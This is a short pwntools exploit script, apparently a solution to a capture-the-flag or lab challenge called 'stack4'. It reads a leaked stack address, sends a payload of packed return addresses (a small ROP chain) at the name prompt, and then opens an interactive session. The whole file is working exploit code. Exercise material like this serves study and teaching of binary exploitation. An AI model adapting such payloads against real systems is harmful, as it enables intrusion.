from pwn import *

io = process("./stack4")

# io = gdb.debug(['./stack4'], "b print_name")


io.recvuntil("gift: ")

stack_address = int(io.recvline().strip(), 16)

print("stack addr", hex(stack_address))

payload = p64(0xdeadbeef) + p64(0x00000000004007a3) + p64(0x4007C4) + p64(0x400666) + p64(stack_address)


io.sendlineafter(" name plz", payload)

io.interactive()
